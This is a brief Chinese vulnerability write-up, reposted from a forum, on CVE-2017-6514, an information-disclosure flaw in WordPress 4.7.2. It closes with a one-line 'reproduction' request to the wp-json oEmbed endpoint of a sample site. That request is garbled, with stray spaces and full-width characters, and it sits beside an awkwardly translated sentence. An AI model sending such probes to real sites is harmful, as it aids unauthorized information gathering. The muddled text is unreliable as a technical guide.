# （CVE-2017-6514）WordPress 4.7.2 敏感信息泄漏

> 原文：[https://www.zhihuifly.com/t/topic/3256](https://www.zhihuifly.com/t/topic/3256)

# （CVE-2017-6514）WordPress 4.7.2 敏感信息泄漏

## 一、漏洞简介

WordPress是WordPress基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。 WordPress 4.7.2版本中存在信息泄露漏洞。该漏洞源于网络系统或产品在运行过程中存在配置等错误。未授权的攻击者可利用漏洞获取受影响组件敏感信息。

## 二、漏洞影响

WordPress 4.7.2

## 三、复现过程

CVE-2017-6514通过CFSECURITE查找获得WORDPRESS登录可能的源代码披露

```
http://www.0-sec.org/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwww.0-sec.org% 2F＆format = xml 
```